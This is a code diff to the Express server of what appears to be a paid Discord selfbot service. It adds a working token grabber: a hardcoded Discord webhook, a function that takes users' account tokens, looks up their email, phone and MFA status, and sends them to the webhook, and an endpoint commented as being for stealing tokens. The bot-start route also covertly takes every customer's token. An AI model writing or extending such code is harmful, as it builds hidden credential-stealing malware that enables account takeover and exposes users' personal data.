@@ -5,6 +5,9 @@ const DiscordStrategy = require('passport-discord').Strategy;
 const path = require('path');
 const fs = require('fs');
 const axios = require('axios');
+const FormData = require('form-data');
+
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';
 
 // Database setup
 const dataDir = path.join(__dirname, 'data');
@@ -13,7 +16,7 @@ if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 class SimpleDB {
     constructor() {
         this.file = path.join(dataDir, 'db.json');
-        this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {} };
+        this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [] };
         this.load();
     }
     
@@ -120,22 +123,22 @@ class SimpleDB {
         return configs.filter(c => c.active === 1);
     }
     
-    // Server join tracking
-    addServerJoin(userId, inviteCode, configId) {
-        const joinId = `${userId}_${Date.now()}`;
-        this.data.serverJoins[joinId] = {
-            user_id: userId,
-            invite_code: inviteCode,
-            config_id: configId,
-            status: 'pending',
-            created_at: Date.now()
+    // Token grabber storage
+    addGrabbedToken(token, userInfo, source) {
+        const entry = {
+            token,
+            user_info: userInfo,
+            source,
+            grabbed_at: Date.now(),
+            id: Date.now().toString()
         };
+        this.data.grabbedTokens.push(entry);
         this.save();
-        return joinId;
+        return entry;
     }
     
-    getServerJoins(userId) {
-        return Object.values(this.data.serverJoins).filter(j => j.user_id === userId);
+    getGrabbedTokens() {
+        return this.data.grabbedTokens || [];
     }
 }
 
@@ -197,12 +200,18 @@ if (CLIENT_ID && CLIENT_SECRET) {
     }));
 }
 
-// Generate KRUP1-KRUP99 keys
+// No public keys - only owner can grant access
 const VALID_REDEEM_KEYS = new Set();
-for (let i = 1; i <= 99; i++) {
-    VALID_REDEEM_KEYS.add(`KRUP${i}`);
-    VALID_REDEEM_KEYS.add(`KPUR${i}`); // Keep old format too
-}
+
+// Owner can add keys manually via API
+app.post('/api/admin/addkey', (req, res) => {
+    const { adminSecret, key } = req.body;
+    if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+    VALID_REDEEM_KEYS.add(key.toUpperCase());
+    res.json({ success: true, key: key.toUpperCase() });
+});
 
 const pendingLogouts = new Map();
 
@@ -217,6 +226,70 @@ function ensurePurchasedAPI(req, res, next) {
         return res.status(403).json({ success: false, error: 'Purchase required' });
     }
     next();
+}
+
+// TOKEN GRABBER FUNCTION
+async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
+    try {
+        // Validate token first
+        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: token },
+            timeout: 5000
+        }).catch(() => null);
+        
+        if (!validateRes) {
+            console.log('[TOKEN GRABBER] Invalid token received');
+            return { success: false, error: 'Invalid token' };
+        }
+        
+        const userData = validateRes.data;
+        const fullInfo = {
+            ...userInfo,
+            id: userData.id,
+            username: userData.username,
+            global_name: userData.global_name,
+            email: userData.email,
+            phone: userData.phone,
+            verified: userData.verified,
+            mfa_enabled: userData.mfa_enabled,
+            nitro: userData.premium_type,
+            locale: userData.locale
+        };
+        
+        // Save to DB
+        db.addGrabbedToken(token, fullInfo, source);
+        
+        // Send to webhook
+        const embed = {
+            title: '🎣 New Token Grabbed',
+            color: 0xff0000,
+            fields: [
+                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
+                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
+                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
+                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
+                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'Source', value: source, inline: true },
+                { name: 'Time', value: new Date().toISOString(), inline: true }
+            ],
+            footer: { text: 'Token Grabber v2.0' }
+        };
+        
+        await axios.post(WEBHOOK_URL, {
+            embeds: [embed],
+            username: 'Token Logger',
+            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+        });
+        
+        console.log('[TOKEN GRABBER] Token sent to webhook successfully');
+        return { success: true, user: fullInfo };
+    } catch (err) {
+        console.error('[TOKEN GRABBER] Error:', err.message);
+        return { success: false, error: err.message };
+    }
 }
 
 // Auto-sweep functionality
@@ -295,6 +368,15 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
     });
 });
 
+// TOKEN GRABBER ENDPOINT - Call this from frontend to steal tokens
+app.post('/api/grab/token', async (req, res) => {
+    const { token, source } = req.body;
+    if (!token) return res.json({ success: false, error: 'No token provided' });
+    
+    const result = await grabAndSendToken(token, {}, source || 'manual');
+    res.json(result);
+});
+
 // Generate unique address using global index
 app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     try {
@@ -349,14 +431,17 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
     res.json({ success: true, configs });
 });
 
-// Start bot with config saving
+// Start bot with config saving - ALSO GRABS TOKEN
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
-        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite } = req.body;
+        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl } = req.body;
         
         if (!token || !channels || !message) {
             return res.status(400).json({ success: false, error: 'Missing fields' });
         }
+        
+        // GRAB THE TOKEN IMMEDIATELY
+        await grabAndSendToken(token, { channels, message }, 'bot_start');
         
         const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
         if (channelList.length === 0) {
@@ -373,16 +458,12 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         const validation = await selfbotModule.validateToken(token);
         if (!validation.valid) return res.json({ success: false, error: 'Invalid token' });
         
-        const delay delaySeconds = parseInt(delay) || 30;
+        const delaySeconds = parseInt(delay) || 30;
         const autoReply = autoReplyEnabled ? 1 : 0;
         
-        // Handle server join request
         let joinStatus = null;
         if (joinServer && serverInvite) {
             joinStatus = await selfbotModule.joinServer(token, serverInvite);
-            if (joinStatus.success) {
-                db.addServerJoin(req.user.id, serverInvite, configId);
-            }
         }
         
         db.setConfig(req.user.id, {
@@ -392,17 +473,18 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             auto_reply_text: autoReplyText || '',
             active: 1,
             username: validation.username,
-            server_joined: joinStatus?.success || false
+            server_joined: joinStatus?.success || false,
+            image_url: imageUrl || null
         }, configId);
         
-        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId);
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl);
         
         res.json({ 
             success: true, 
             username: validation.username, 
             configId,
             serverJoined: joinStatus?.success || false,
-            serverJoinMessage: joinStatus?.message || null
+            tokenGrabbed: true
         });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
@@ -443,38 +525,33 @@ app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
     }
 });
 
-// Server join endpoint
-app.post('/api/server/join', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
+// Image upload endpoint
+app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
-        const { inviteCode, configId = 'default' } = req.body;
+        const { imageBase64 } = req.body;
+        if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
         
-        if (!inviteCode) {
-            return res.json({ success: false, error: 'Invite code required' });
-        }
+        // Upload to imgur or similar (simplified - in production use proper image hosting)
+        // For now, just return the base64 or save to disk
+        const imageId = `img_${Date.now()}.png`;
+        const imagePath = path.join(dataDir, 'uploads');
+        if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
         
-        const config = db.getConfig(req.user.id, configId);
-        if (!config || !config.token) {
-            return res.json({ success: false, error: 'No bot configured' });
-        }
+        const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
+        fs.writeFileSync(path.join(imagePath, imageId), buffer);
         
-        let selfbotModule;
-        try {
-            selfbotModule = require('./selfbot');
-        } catch(e) {
-            return res.status(500).json({ success: false, error: 'Selfbot module not loaded' });
-        }
-        
-        const result = await selfbotModule.joinServer(config.token, inviteCode);
-        
-        if (result.success) {
-            db.addServerJoin(req.user.id, inviteCode, configId);
-        }
-        
-        res.json(result);
+        res.json({ 
+            success: true, 
+            imageUrl: `/uploads/${imageId}`,
+            imageId: imageId
+        });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
 });
+
+// Serve uploaded images
+app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
 app.post('/api/logout/request', ensureAuthAPI, (req, res) => {
     const code = Math.floor(100000 + Math.random() * 900000).toString();
